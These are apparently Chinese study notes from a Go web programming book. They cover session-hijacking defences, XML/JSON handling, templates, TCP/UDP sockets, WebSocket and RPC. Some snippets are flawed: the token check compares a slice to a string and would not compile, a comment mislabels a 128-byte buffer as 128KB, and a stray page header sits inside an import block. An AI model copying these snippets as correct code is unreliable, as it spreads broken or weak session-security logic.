session劫持是一种广泛存在的比较严重的安全威胁，在session技术中，客户端和服务端通过session的标识符来维护会话， 但这个标识符很容易就能被嗅探到，从而被其他人利用.它是中间人攻击的一种类型。

#### session劫持过程
我们写了如下的代码来展示一个count计数器：
```go
func count(w http.ResponseWriter, r *http.Request) {
sess := globalSessions.SessionStart(w, r)
ct := sess.Get("countnum")
if ct == nil {
sess.Set("countnum", 1)
} else {
sess.Set("countnum", (ct.(int) + 1))
}
t, _ := template.ParseFiles("count.gtpl")
w.Header().Set("Content-Type", "text/html")
t.Execute(w, sess.Get("countnum"))
}
```

#### session劫持防范
**cookieonly和token**

其中一个解决方案就是sessionID的值只允许cookie设置，而不是通过URL重置方式设置，同时设置cookie的httponly为true,这个属性是设置是否可通过客户端脚本访问
这个设置的cookie，第一这个可以防止这个cookie被XSS读取从而引起session劫
持，第二cookie设置不会像URL重置方式那么容易获取sessionID。
第二步就是在每个请求里面加上token，实现类似前面章节里面讲的防止form重复
递交类似的功能，我们在每个请求里面加上一个隐藏的token，然后每次验证这个
token，从而保证用户的请求都是唯一性。
```go
h := md5.New()
salt:="astaxie%^7&8888"
io.WriteString(h,salt+time.Now().String())
token:=fmt.Sprintf("%x",h.Sum(nil))
if r.Form["token"]!=token{
//提示登录
}
sess.Set("token",token)
```
间隔生成新的SID

还有一个解决方案就是，我们给session额外设置一个创建时间的值，一旦过了一定
的时间，我们销毁这个sessionID，重新生成新的session，这样可以一定程度上防
止session劫持的问题。
createtime := sess.Get("createtime")
if createtime == nil {
sess.Set("createtime", time.Now().Unix())
} else if (createtime.(int64) + 60) < (time.Now().Unix()) {
globalSessions.SessionDestroy(w, r)
sess = globalSessions.SessionStart(w, r)
}
session启动后，我们设置了一个值，用于记录生成sessionID的时间。通过判断每
次请求是否过期(这里设置了60秒)定期生成新的ID，这样使得攻击者获取有效
sessionID的机会大大降低。
上面两个手段的组合可以在实践中消除session劫持的风险，一方面， 由于
sessionID频繁改变，使攻击者难有机会获取有效的sessionID；另一方面，因为
sessionID只能在cookie中传递，然后设置了httponly，所以基于URL攻击的可能性
为零，同时被XSS获取sessionID也不可能。最后，由于我们还设置了MaxAge=0，
这样就相当于session cookie不会留在浏览器的历史记录里面。

## 文本处理
### xml处理
```xml
<?xml version="1.0" encoding="utf-8"?>
<servers version="1">
<server>
<serverName>Shanghai_VPN</serverName>
<serverIP>127.0.0.1</serverIP>
</server>
<server>
<serverName>Beijing_VPN</serverName>
<serverIP>127.0.0.2</serverIP>
</server>
</servers>
```

如何解析如上这个XML文件呢？ 我们可以通过xml包的 Unmarshal 函数来达到我们的目的
```go
func Unmarshal(data []byte, v interface{}) error
``` 
data接收的是XML数据流，v是需要输出的结构，定义为interface，也就是可以把XML转换为任意的格式。我们这里主要介绍struct的转换，因为struct和XML都有类
似树结构的特征。
示例代码如下：
```go
package main
import (
"encoding/xml"
"fmt"
"io/ioutil"
"os"
)
type Recurlyservers struct {
XMLName xml.Name `xml:"servers"`
Version string `xml:"version,attr"`
Svs []server `xml:"server"`
Description string `xml:",innerxml"`
}
type server struct {
XMLName xml.Name `xml:"server"`
ServerName string `xml:"serverName"`
ServerIP string `xml:"serverIP"`
}
func main() {
file, err := os.Open("servers.xml") // For read access.
if err != nil {
fmt.Printf("error: %v", err)
return
}
defer file.Close()
data, err := ioutil.ReadAll(file)
if err != nil {
fmt.Printf("error: %v", err)
return
}
v := Recurlyservers{}
err = xml.Unmarshal(data, &v)
if err != nil {
fmt.Printf("error: %v", err)
return
}
fmt.Println(v)
}
```
XML本质上是一种树形的数据格式，而我们可以定义与之匹配的go 语言的 struct类型，然后通过xml.Unmarshal来将xml中的数据解析成对应的struct对象。如上例子输出如下数据
```xml
{{ servers} 1 [{{ server} Shanghai_VPN 127.0.0.1} {{ server} Beijing_VPN 127.0.0.2}]
<server>
<serverName>Shanghai_VPN</serverName>
<serverIP>127.0.0.1</serverIP>
</server>
<server>
<serverName>Beijing_VPN</serverName>
<serverIP>127.0.0.2</serverIP>
</server>
}
```
上面的例子中，将xml文件解析成对应的struct对象是通过 xml.Unmarshal 来完成的，这个过程是如何实现的？可以看到我们的struct定义后面多了一些类似于 xml:"serverName" 这样的内容,这个是struct的一个特性，它们被称为 struct tag，它们是用来辅助反射的。我们来看一下 Unmarshal 的定义：
```go
func Unmarshal(data []byte, v interface{}) error
```

我们看到函数定义了两个参数，第一个是XML数据流，第二个是存储的对应类型，目前支持struct、slice和string，XML包内部采用了反射来进行数据的映射，所以v里面的字段必须是导出的。 Unmarshal 解析的时候XML元素和字段怎么对应起来
的呢？这是有一个优先级读取流程的，首先会读取struct tag，如果没有，那么就会对应字段名。必须注意一点的是解析的时候tag、字段名、XML元素都是大小写敏感的，所以必须一一对应字段。
Go语言的反射机制，可以利用这些tag信息来将来自XML文件中的数据反射成对应的struct对象，关于反射如何利用struct tag的更多内容请参阅reflect中的相关内容。
解析XML到struct的时候遵循如下的规则：
- 如果struct的一个字段是string或者[]byte类型且它的tag含有 ",innerxml" ，Unmarshal将会将此字段所对应的元素内所有内嵌的原始xml累加到此字段上，如上面例子Description定义。最后的输出是
```xml
<server>
<serverName>Shanghai_VPN</serverName>
<serverIP>127.0.0.1</serverIP>
</server>
<server>
<serverName>Beijing_VPN</serverName>
<serverIP>127.0.0.2</serverIP>
</server>
```
- 如果struct中有一个叫做XMLName，且类型为xml.Name字段，那么在解析的时候就会保存这个element的名字到该字段,如上面例子中的servers。

- 如果某个struct字段的tag定义中含有XML结构中element的名称，那么解析的时候就会把相应的element值赋值给该字段，如上servername和serverip定义。
- 如果某个struct字段的tag定义了中含有 ",attr" ，那么解析的时候就会将该结构所对应的element的与字段同名的属性的值赋值给该字段，如上version定义。
- 如果某个struct字段的tag定义 型如 "a>b>c" ,则解析的时候，会将xml结构a下面的b下面的c元素的值赋值给该字段。
- 如果某个struct字段的tag定义了 "-" ,那么不会为该字段解析匹配任何xml数据。
- 如果struct字段后面的tag定义了 ",any" ，如果他的子元素在不满足其他的规则的时候就会匹配到这个字段。
- 如果某个XML元素包含一条或者多条注释，那么这些注释将被累加到第一个tag含有",comments"的字段上，这个字段的类型可能是[]byte或string,如果没有这样的字段存在，那么注释将会被抛弃。
#### 输出XML
假若我们不是要解析如上所示的XML文件，而是生成它，那么在go语言中又该如何实现呢？ xml包中提供了 Marshal 和 MarshalIndent 两个函数，来满足我们的
需求。这两个函数主要的区别是第二个函数会增加前缀和缩进，函数的定义如下所示：
```go
func Marshal(v interface{}) ([]byte, error)
func MarshalIndent(v interface{}, prefix, indent string) ([]byte, error)
```
```go
package main
import (
"encoding/xml"
"fmt"
"os"
)
type Servers struct {
XMLName xml.Name `xml:"servers"`
Version string `xml:"version,attr"`
Svs []server `xml:"server"`
}
type server struct {
ServerName string `xml:"serverName"`
ServerIP string `xml:"serverIP"`
}
func main() {
v := &Servers{Version: "1"}
v.Svs = append(v.Svs, server{"Shanghai_VPN", "127.0.0.1"})
v.Svs = append(v.Svs, server{"Beijing_VPN", "127.0.0.2"})
output, err := xml.MarshalIndent(v, " ", " ")
if err != nil {
fmt.Printf("error: %v\n", err)
}
os.Stdout.Write([]byte(xml.Header))
os.Stdout.Write(output)
}
```
上面的代码输出如下信息：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<servers version="1">
<server>
<serverName>Shanghai_VPN</serverName>
<serverIP>127.0.0.1</serverIP>
</server>
<server>
<serverName>Beijing_VPN</serverName>
<serverIP>127.0.0.2</serverIP>
</server>
</servers>
```
和我们之前定义的文件的格式一模一样，之所以会
有 os.Stdout.Write([]byte(xml.Header)) 这句代码的出现，是因为 xml.MarshalIndent 或者 xml.Marshal 输出的信息都是不带XML头的，为了生成正确的xml文件，我们使用了xml包预定义的Header变量。

元素名按照如下优先级从struct中获取：
- 如果v是struct，XMLName的tag中定义的名称
- 类型为xml.Name的名叫XMLName的字段的值
- 通过struct中字段的tag来获取
- 通过struct的字段名用来获取
- marshall的类型名称
我们应如何设置struct 中字段的tag信息以控制最终xml文件的生成呢？
- XMLName不会被输出
- tag中含有 "-" 的字段不会输出
- tag中含有 "name,attr" ，会以name作为属性名，字段值作为值输出为这个XML元素的属性，如上version字段所描述
- tag中含有 ",attr" ，会以这个struct的字段名作为属性名输出为XML元素的属性，类似上一条，只是这个name默认是字段名了。
- tag中含有 ",chardata" ，输出为xml的 character data而非element。
- tag中含有 ",innerxml" ，将会被原样输出，而不会进行常规的编码过程
- tag中含有 ",comment" ，将被当作xml注释来输出，而不会进行常规的编码过程，字段值中不能含有"--"字符串
- tag中含有 "omitempty" ,如果该字段的值为空值那么该字段就不会被输出到XML，空值包括：false、0、nil指针或nil接口，任何长度为0的array, slice,map或者string
- tag中含有 "a>b>c" ，那么就会循环输出三个元素a包含b，b包含c，例如如下
代码就会输出
```go
FirstName string `xml:"name>first"`
LastName string `xml:"name>last"`
<name>
<first>Asta</first>
<last>Xie</last>
</name>
```
### JSON处理
```go
package main
import (
"encoding/json"
"fmt"
)
type Server struct {
ServerName string
ServerIP string
}
type Serverslice struct {
Servers []Server
}
func main() {
var s Serverslice
str := `{"servers":[{"serverName":"Shanghai_VPN","serverIP":"127.0.0.1"},{"serverName":"Beijing_VPN","serverIP":"127.0.0.2"}]}`
json.Unmarshal([]byte(str), &s)
fmt.Println(s)
}
```
#### 解析到interface
我们知道interface{}可以用来存储任意数据类型的对象，这种数据结构正好用于存储解析的未知结构的json数据的结果。JSON包中采用map[string]interface{}和
[]interface{}结构来存储任意的JSON对象和数组。Go类型和JSON类型的对应关系
如下：
```go
bool 代表 JSON booleans,
float64 代表 JSON numbers,
string 代表 JSON strings,
nil 代表 JSON null.
```
现在我们假设有如下的JSON数据
```go
b := []byte(`{"Name":"Wednesday","Age":6,"Parents":["Gomez","Morticia"]}`)
```
如果在我们不知道他的结构的情况下，我们把他解析到interface{}里面
```go
var f interface{}
err := json.Unmarshal(b, &f)
```
这个时候f里面存储了一个map类型，他们的key是string，值存储在空的interface{}里
```go
f = map[string]interface{}{
"Name": "Wednesday",
"Age": 6,
"Parents": []interface{}{
"Gomez",
"Morticia",
},
}
```
那么如何来访问这些数据呢？通过断言的方式：
```go
m := f.(map[string]interface{})
```
```go
for k, v := range m {
switch vv := v.(type) {
case string:
fmt.Println(k, "is string", vv)
case int:
fmt.Println(k, "is int", vv)
case float64:
fmt.Println(k,"is float64",vv)
case []interface{}:
fmt.Println(k, "is an array:")
for i, u := range vv {
fmt.Println(i, u)
}
default:
fmt.Println(k, "is of a type I don't know how to handle")
}
}
```

上面这个是官方提供的解决方案，其实很多时候我们通过类型断言，操作起来不是很方便，目前bitly公司开源了一个叫做 simplejson 的包,在处理未知结构体的JSON时相当方便，详细例子如下所示：
```go
js, err := NewJson([]byte(`{
"test": {
"array": [1, "2", 3],
"int": 10,
"float": 5.150,
"bignum": 9223372036854775807,
"string": "simplejson",
"bool": true
}
}`))
arr, _ := js.Get("test").Get("array").Array()
i, _ := js.Get("test").Get("int").Int()
ms := js.Get("test").Get("string").MustString()
```
### 模板处理
```go
func handler(w http.ResponseWriter, r *http.Request) {
t := template.New("some template") //创建一个模板
t, _ = t.ParseFiles("tmpl/welcome.html", nil) //解析模板文件
user := GetUser() //获取当前用户信息
t.Execute(w, user) //执行模板的merger操作
}
```
为了演示和测试代码的方便，我们在接下来的例子中采用如下格式的代码
- 使用Parse代替ParseFiles，因为Parse可以直接测试一个字符串，而不需要额外的文件
- 不使用handler来写演示代码，而是每个测试一个main，方便测试
- 使用 os.Stdout 代替 http.ResponseWriter ，因为 os.Stdout 实现了 io.Writer 接口


#### 字段操作
Go语言的模板通过 {{}} 来包含需要在渲染时被替换的字段， {{.}} 表示当前的
对象，这和Java或者C++中的this类似，如果要访问当前对象的字段通过 {{.FieldName}} ,但是需要注意一点：这个字段必须是导出的(字段首字母必须是大写的),否则在渲染的时候就会报错，请看下面的这个例子：
```go
package main
import (
"html/template"
"os"
)
type Person struct {
UserName string
}
func main() {
t := template.New("fieldname example")
t, _ = t.Parse("hello {{.UserName}}!")
p := Person{UserName: "Astaxie"}
t.Execute(os.Stdout, p)
}
```


#### 输出嵌套字段内容
上面我们例子展示了如何针对一个对象的字段输出，那么如果字段里面还有对象，如何来循环的输出这些内容呢？我们可以使
用 {{with …}}…{{end}} 和 {{range …}}{{end}} 来进行数据的输出。
- {{range}} 这个和Go语法里面的range类似，循环操作数据
- {{with}}操作是指当前对象的值，类似上下文的概念
详细的使用请看下面的例子：
```go
package main
import (
"html/template"
"os"
)
type Friend struct {
Fname string
}
type Person struct {
UserName string
Emails []string
Friends []*Friend
}
func main() {
f1 := Friend{Fname: "minux.ma"}
f2 := Friend{Fname: "xushiwei"}
t := template.New("fieldname example")
t, _ = t.Parse(`hello {{.UserName}}!
{{range .Emails}}
an email {{.}}
{{end}}
{{with .Friends}}
{{range .}}
my friend name is {{.Fname}}
{{end}}
{{end}}
`)
p := Person{UserName: "Astaxie",
Emails: []string{"astaxie@beego.me", "astaxie@gmail.com"},
Friends: []*Friend{&f1, &f2}}
t.Execute(os.Stdout, p)
}
```
#### 条件处理

在Go模板里面如果需要进行条件判断，那么我们可以使用和Go语言的 if-else 语法类似的方式来处理，如果pipeline为空，那么if就认为是false，下
面的例子展示了如何使用 if-else 语法：
```go
package main
import (
"os"
"text/template"
)
func main() {
tEmpty := template.New("template test")
tEmpty = template.Must(tEmpty.Parse("空 pipeline if demo: {{if ``}} 不会输出. {{end}}\n"))
tEmpty.Execute(os.Stdout, nil)
tWithValue := template.New("template test")
tWithValue = template.Must(tWithValue.Parse("不为空的 pipeline if demo: {{if `anything`}} 我有内容，我会输出. {{end}}\n"))
tWithValue.Execute(os.Stdout, nil)
tIfElse := template.New("template test")
tIfElse = template.Must(tIfElse.Parse("if-else demo: {{if `anything`}} if部分 {{else}} else部分.{{end}}\n"))
tIfElse.Execute(os.Stdout, nil)
}
```

#### pipelines
{{. | html}}
在email输出的地方我们可以采用如上方式可以把输出全部转化html的实体，上面的
这种方式和我们平常写Unix的方式是不是一模一样，操作起来相当的简便，调用其他的函数也是类似的方式。

#### 模板变量
有时候，我们在模板使用过程中需要定义一些局部变量，我们可以在一些操作中申
```go
明局部变量，例如 with``range``if 过程中申明局部变量，这个变量的作用域
是 {{end}} 之前，Go语言通过申明的局部变量格式如下所示：
$variable := pipeline
详细的例子看下面的：
{{with $x := "output" | printf "%q"}}{{$x}}{{end}}
{{with $x := "output"}}{{printf "%q" $x}}{{end}}
{{with $x := "output"}}{{$x | printf "%q"}}{{end}}
```
#### 模板函数
模板在输出对象的字段值时，采用了 fmt 包把对象转化成了字符串。但是有时候我们的需求可能不是这样的，例如有时候我们为了防止垃圾邮件发送者通过采集网页的方式来发送给我们的邮箱信息，我们希望把 @ 替换成 at 例
如： astaxie at beego.me ，如果要实现这样的功能，我们就需要自定义函数来
做这个功能。
每一个模板函数都有一个唯一值的名字，然后与一个Go函数关联，通过如下的方式
来关联
type FuncMap map[string]interface{}
例如，如果我们想要的email函数的模板函数名是 emailDeal ，它关联的Go函数
名称是 EmailDealWith ,那么我们可以通过下面的方式来注册这个函数
t = t.Funcs(template.FuncMap{"emailDeal": EmailDealWith})
EmailDealWith 这个函数的参数和返回值定义如下：
func EmailDealWith(args …interface{}) string
我们来看下面的实现例子：
```go
package main
import (
"fmt"
Go Web 编程
模板处理 215
"html/template"
"os"
"strings"
)
type Friend struct {
Fname string
}
type Person struct {
UserName string
Emails []string
Friends []*Friend
}
func EmailDealWith(args ...interface{}) string {
ok := false
var s string
if len(args) == 1 {
s, ok = args[0].(string)
}
if !ok {
s = fmt.Sprint(args...)
}
// find the @ symbol
substrs := strings.Split(s, "@")
if len(substrs) != 2 {
return s
}
// replace the @ by " at "
return (substrs[0] + " at " + substrs[1])
}
func main() {
f1 := Friend{Fname: "minux.ma"}
f2 := Friend{Fname: "xushiwei"}
t := template.New("fieldname example")
t = t.Funcs(template.FuncMap{"emailDeal": EmailDealWith})
t, _ = t.Parse(`hello {{.UserName}}!
{{range .Emails}}
an emails {{.|emailDeal}}
{{end}}
{{with .Friends}}
{{range .}}
my friend name is {{.Fname}}
{{end}}
{{end}}
`)
p := Person{UserName: "Astaxie",
Emails: []string{"astaxie@beego.me", "astaxie@gmail.com"},
Friends: []*Friend{&f1, &f2}}
t.Execute(os.Stdout, p)
}
```
## web服务

### Socket编程
#### 什么是Socket？
Socket起源于Unix，而Unix基本哲学之一就是“一切皆文件”，都可以用“打开open –> 读写write/read –> 关闭close”模式来操作。Socket就是该模式的一个实现，网络
的Socket数据传输是一种特殊的I/O，Socket也是一种文件描述符。Socket也具有一个类似于打开文件的函数调用：Socket()，该函数返回一个整型的Socket描述符，随后的连接建立、数据传输等操作都是通过该Socket实现的。
常用的Socket类型有两种：流式Socket（SOCK_STREAM）和数据报式Socket（SOCK_DGRAM）。流式是一种面向连接的Socket，针对于面向连接的TCP服务应用；数据报式Socket是一种无连接的Socket，对应于无连接的UDP服务应用。
#### Socket基础
套接字（socket）是通信的基石，是支持TCP/IP协议的网络通信的基本操作单元。它是网络通信过程中端点的抽象表示，包含进行网络通信必须的五种信息：连接使用的协议，本地主机的IP地址，本地进程的协议端口，远地主机的IP地址，远地进程的协议端口。
#### TCP Socket

在Go语言的 net 包中有一个类型 TCPConn ，这个类型可以用来作为客户端和服务器端交互的通道，他有两个主要的函数：
```go
func (c *TCPConn) Write(b []byte) (n int, err os.Error)
func (c *TCPConn) Read(b []byte) (n int, err os.Error)
```
TCPConn 可以用在客户端和服务器端来读写数据。
还有我们需要知道一个 TCPAddr 类型，他表示一个TCP的地址信息，他的定义如
下：
```go
type TCPAddr struct {
IP IP
Port int
}
```
在Go语言中通过 ResolveTCPAddr 获取一个 TCPAddr
```go
func ResolveTCPAddr(net, addr string) (*TCPAddr, os.Error)
```
- net参数是"tcp4"、"tcp6"、"tcp"中的任意一个，分别表示TCP(IPv4-only),TCP(IPv6-only)或者TCP(IPv4,IPv6的任意一个).
- addr表示域名或者IP地址，例如"www.google.com:80" 或者"127.0.0.1:22".
##### TCP client
Go语言中通过net包中的 DialTCP 函数来建立一个TCP连接，并返回一个 TCPConn 类型的对象，当连接建立时服务器端也创建一个同类型的对象，此时客户端和服务器段通过各自拥有的 TCPConn 对象来进行数据交换。一般而言，客户端通过 TCPConn 对象将请求信息发送到服务器端，读取服务器端响应的信息。服务器端读取并解析来自客户端的请求，并返回应答信息，这个连接只有当任一端关闭了连接之后才失效，不然这连接可以一直在使用。建立连接的函数定义如下：
```go
func DialTCP(net string, laddr, raddr *TCPAddr) (c *TCPConn, err os.Error)
```
- net参数是"tcp4"、"tcp6"、"tcp"中的任意一个，分别表示TCP(IPv4-only)、TCP(IPv6-only)或者TCP(IPv4,IPv6的任意一个)
- laddr表示本机地址，一般设置为nil
- raddr表示远程的服务地址
接下来我们写一个简单的例子，模拟一个基于HTTP协议的客户端请求去连接一个Web服务端。我们要写一个简单的http请求头，格式类似如下：
"HEAD / HTTP/1.0\r\n\r\n"
从服务端接收到的响应信息格式可能如下：
```h
HTTP/1.0 200 OK
ETag: "-9985996"
Last-Modified: Thu, 25 Mar 2010 17:51:10 GMT
Content-Length: 18074
Connection: close
Date: Sat, 28 Aug 2010 00:43:48 GMT
Server: lighttpd/1.4.23
```
我们的客户端代码如下所示：
```go
package main
import (
"fmt"
"io/ioutil"
"net"
"os"
)
func main() {
    //程序获取运行他时给出的参数
if len(os.Args) != 2 {
fmt.Fprintf(os.Stderr, "Usage: %s host:port ", os.Args[0])
os.Exit(1)
}
service := os.Args[1]
tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
checkError(err)
conn, err := net.DialTCP("tcp", nil, tcpAddr)
checkError(err)
_, err = conn.Write([]byte("HEAD / HTTP/1.0\r\n\r\n"))
checkError(err)
result, err := ioutil.ReadAll(conn)
checkError(err)
fmt.Println(string(result))
os.Exit(0)
}
func checkError(err error) {
if err != nil {
fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
os.Exit(1)
}
}
```
通过上面的代码我们可以看出：首先程序将用户的输入作为参数 service 传入 net.ResolveTCPAddr 获取一个tcpAddr,然后把tcpAddr传入DialTCP后创建了一个TCP连接 conn ，通过 conn 来发送请求信息，最后通过 ioutil.ReadAll 从 conn 中读取全部的文本，也就是服务端响应反馈的信息。

#### TCP server
函数定义如下：
```go
func ListenTCP(net string, laddr *TCPAddr) (l *TCPListener, err os.Error)
func (l *TCPListener) Accept() (c Conn, err os.Error)
```
参数说明同DialTCP的参数一样。下面我们实现一个简单的时间同步服务，监听
```go
package main
import (
"fmt"
"net"
"os"
"time"
"strconv"
"strings"
)
func main() {
//监听的端口号
service := ":1200"
tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
checkError(err)
listener, err := net.ListenTCP("tcp", tcpAddr)
checkError(err)
for {
//循环监听端口    
conn, err := listener.Accept()
if err != nil {
continue
}
// 支持并发
go handleClient(conn)
}
}
func handleClient(conn net.Conn) {
conn.SetReadDeadline(time.Now().Add(2 * time.Minute)) // set 2 minutes timeout
request := make([]byte, 128) // set maxium request length to 128KB to prevent flood attack
defer conn.Close() // close connection before exit
for {
read_len, err := conn.Read(request)
if err != nil {
fmt.Println(err)
break
}
if read_len == 0 {
break // connection already closed by client
} else if strings.TrimSpace(string(request[:read_len])) == "timestamp" {
daytime := strconv.FormatInt(time.Now().Unix(), 10)
conn.Write([]byte(daytime))
} else {
daytime := time.Now().String()
conn.Write([]byte(daytime))
}
request = make([]byte, 128) // clear last read content
}
}
func checkError(err error) {
if err != nil {
fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
os.Exit(1)
}
}
```
在上面这个例子中，我们使用 conn.Read() 不断读取客户端发来的请求。由于我们需要保持与客户端的长连接，所以不能在读取完一次请求后就关闭连接。由于 conn.SetReadDeadline() 设置了超时，当一定时间内客户端无请求发送， conn 便会自动关闭，下面的for循环即会因为连接已关闭而跳出。需要注意的是， request 在创建时需要指定一个最大长度以防止flood attack；每次读取到请
求处理完毕后，需要清理request，因为 conn.Read() 会将新读取到的内容append到原内容之后。
##### 控制TCP连接
TCP有很多连接控制函数，我们平常用到比较多的有如下几个函数：
```go
func DialTimeout(net, addr string, timeout time.Duration) (Conn, error)
```
设置建立连接的超时时间，客户端和服务器端都适用，当超过设置时间时，连接自动关闭。
```go
func (c *TCPConn) SetReadDeadline(t time.Time) error
func (c *TCPConn) SetWriteDeadline(t time.Time) error
```
用来设置写入/读取一个连接的超时时间。当超过设置时间时，连接自动关闭。
```go
func (c *TCPConn) SetKeepAlive(keepalive bool) os.Error
```
设置客户端是否和服务器端保持长连接，可以降低建立TCP连接时的握手开销，对于一些需要频繁交换数据的应用场景比较适用。

#### UDP Socket
Go语言包中处理UDP Socket和TCP Socket不同的地方就是在服务器端处理多个客户端请求数据包的方式不同,UDP缺少了对客户端连接请求的Accept函数。其他基本几乎一模一样，只有TCP换成了UDP而已。UDP的几个主要函数如下所示：
```go
func ResolveUDPAddr(net, addr string) (*UDPAddr, os.Error)
func DialUDP(net string, laddr, raddr *UDPAddr) (c *UDPConn, err os.Error)
func ListenUDP(net string, laddr *UDPAddr) (c *UDPConn, err os.Error)
func (c *UDPConn) ReadFromUDP(b []byte) (n int, addr *UDPAddr, err os.Error
func (c *UDPConn) WriteToUDP(b []byte, addr *UDPAddr) (n int, err os.Error)
```
一个UDP的客户端代码如下所示,我们可以看到不同的就是TCP换成了UDP而已：
```go
package main
import (
"fmt"
"net"
"os"
)
func main() {
if len(os.Args) != 2 {
fmt.Fprintf(os.Stderr, "Usage: %s host:port", os.Args[0])
os.Exit(1)
}
service := os.Args[1]
udpAddr, err := net.ResolveUDPAddr("udp4", service)
checkError(err)
conn, err := net.DialUDP("udp", nil, udpAddr)
checkError(err)
_, err = conn.Write([]byte("anything"))
checkError(err)
var buf [512]byte
n, err := conn.Read(buf[0:])
checkError(err)
fmt.Println(string(buf[0:n]))
os.Exit(0)
}
func checkError(err error) {
if err != nil {
fmt.Fprintf(os.Stderr, "Fatal error ", err.Error())
os.Exit(1)
}
}
```
```go
package main
import (
"fmt"
"net"
"os"
"time"
)
func main() {
service := ":1200"
udpAddr, err := net.ResolveUDPAddr("udp4", service)
checkError(err)
conn, err := net.ListenUDP("udp", udpAddr)
checkError(err)
for {
handleClient(conn)
}
}
func handleClient(conn *net.UDPConn) {
var buf [512]byte
_, addr, err := conn.ReadFromUDP(buf[0:])
if err != nil {
return
}
daytime := time.Now().String()
conn.WriteToUDP([]byte(daytime), addr)
}
func checkError(err error) {
if err != nil {
fmt.Fprintf(os.Stderr, "Fatal error ", err.Error())
os.Exit(1)
}
}
```
#### WebSocket
WebSocket采用了一些特殊的报头，使得浏览器和服务器只需要做一个握手的动作，就可以在浏览器和服务器之间建立一条连接通道。且此连接会保持在活动状态，你可以使用JavaScript来向连接写入或从中接收数据，就像在使用一个常规的
TCP Socket一样。它解决了Web实时化的问题，相比传统HTTP有如下好处：
- 一个Web客户端只建立一个TCP连接
- Websocket服务端可以推送(push)数据到web客户端.
- 有更加轻量级的头，减少数据传送量
##### WebSocket原理
WebSocket的协议颇为简单，在第一次handshake通过以后，连接便建立成功，其后的通讯数据都是以”\x00″开头，以”\xFF”结尾。在客户端，这个是透明的，
WebSocket组件会自动将原始数据“掐头去尾”。
浏览器发出WebSocket连接请求，然后服务器发出回应，然后连接建立成功，这个过程通常称为“握手” (handshaking)。

### Go实现WebSocket
Go语言标准包里面没有提供对WebSocket的支持，但是在由官方维护的go.net子包中有对这个的支持，你可以通过如下的命令获取该包：
go get code.google.com/p/go.net/websocket
WebSocket分为客户端和服务端，接下来我们将实现一个简单的例子:用户输入信息，客户端通过WebSocket将信息发送给服务器端，服务器端收到信息之后主动Push信息到客户端，然后客户端将输出其收到的信息，客户端的代码如下：

```html
<html>
<head></head>
<body>
<script type="text/javascript">
var sock = null;
var wsuri = "ws://127.0.0.1:1234";
window.onload = function() {
console.log("onload");
sock = new WebSocket(wsuri);
sock.onopen = function() {
console.log("connected to " + wsuri);
}
sock.onclose = function(e) {
console.log("connection closed (" + e.code + ")");
}
sock.onmessage = function(e) {
console.log("message received: " + e.data);
}
};
function send() {
var msg = document.getElementById('message').value;
sock.send(msg);
};
</script>
<h1>WebSocket Echo Test</h1>
<form>
<p>
Message: <input id="message" type="text" value="Hello, world!">
</p>
</form>
<button onclick="send();">Send Message</button>
</body>
</html>
```
可以看到客户端JS，很容易的就通过WebSocket函数建立了一个与服务器的连接sock，当握手成功后，会触发WebScoket对象的onopen事件，告诉客户端连接已
经成功建立。客户端一共绑定了四个事件。
1）onopen 建立连接后触发
2）onmessage 收到消息后触发
3）onerror 发生错误时触发
4）onclose 关闭连接时触发

我们服务器端的实现如下：
```go
package main
import (
"code.google.com/p/go.net/websocket"
"fmt"
"log"
"net/http"
)
func Echo(ws *websocket.Conn) {
var err error
for {
var reply string
if err = websocket.Message.Receive(ws, &reply); err != nil {
fmt.Println("Can't receive")
break
}
fmt.Println("Received back from client: " + reply)
msg := "Received: " + reply
fmt.Println("Sending to client: " + msg)
if err = websocket.Message.Send(ws, msg); err != nil {
fmt.Println("Can't send")
break
}
}
}
func main() {
http.Handle("/", websocket.Handler(Echo))
if err := http.ListenAndServe(":1234", nil); err != nil {
log.Fatal("ListenAndServe:", err)
}
}
```
### RPC
了解了Socket和HTTP采用的是类似"信息交换"模式，即客户端发送一条信息到服务端，然后(一般来说)服务器端都会返回一定的信息以表示响应。客户端和服务端之间约定了交互信息的格式，以便双方都能够解析交互所产生的信息。但是很多独立
的应用并没有采用这种模式，而是采用类似常规的函数调用的方式来完成想要的功能。
RPC就是想实现函数调用模式的网络化。客户端就像调用本地函数一样，然后客户端把这些参数打包之后通过网络传递到服务端，服务端解包到处理过程中执行，然后执行的结果反馈给客户端。
RPC（Remote Procedure Call Protocol）——远程过程调用协议，是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。它假定某些传输协议的存在，如TCP或UDP，以便为通信程序之间携带信息数据。通过它可以
使函数调用模式网络化。在OSI网络通信模型中，RPC跨越了传输层和应用层。
RPC使得开发包括网络分布式多程序在内的应用程序更加容易。
RPC工作原理
<img src="img\屏幕截图 2023-01-19 174544.png>

##### Go RPC
Go标准包中已经提供了对RPC的支持，而且支持三个级别的RPC：TCP、HTTP、JSONRPC。但Go的RPC包是独一无二的RPC，它和传统的RPC系统不同，它只支持Go开发的服务器与客户端之间的交互，因为在内部，它们采用了Gob来编码。

Go RPC的函数只有符合下面的条件才能被远程访问，不然会被忽略，详细的要求
如下：
- 函数必须是导出的(首字母大写)
- 必须有两个导出类型的参数，
- 第一个参数是接收的参数，第二个参数是返回给客户端的参数，第二个参数必须是指针类型的
- 函数还要有一个返回值error
举个例子，正确的RPC函数格式如下：
```go
func (t *T) MethodName(argType T1, replyType *T2) error
```
T、T1和T2类型必须能被 encoding/gob 包编解码。
任何的RPC都需要通过网络来传递数据，Go RPC可以利用HTTP和TCP来传递数据，利用HTTP的好处是可以直接复用 net/http 里面的一些函数。
HTTP RPC
http 的服务端代码实现如下：

```go
package main

import (
    "errors"
    "fmt"
    "net/http"
    "net/rpc"
)

type Args struct {
    A, B int
}

type Quotient struct {
    Quo, Rem int
}

type Arith int

func (t *Arith) Multiply(args *Args, reply *int) error {
    *reply = args.A * args.B
    return nil
}

func (t *Arith) Divide(args *Args, quo *Quotient) error {
    if args.B == 0 {
        return errors.New("divide by zero")
    }
    quo.Quo = args.A / args.B
    quo.Rem = args.A % args.B
    return nil
}

func main() {

    arith := new(Arith)
    rpc.Register(arith)
    rpc.HandleHTTP()

    err := http.ListenAndServe(":1234", nil)
    if err != nil {
        fmt.Println(err.Error())
    }
}
```
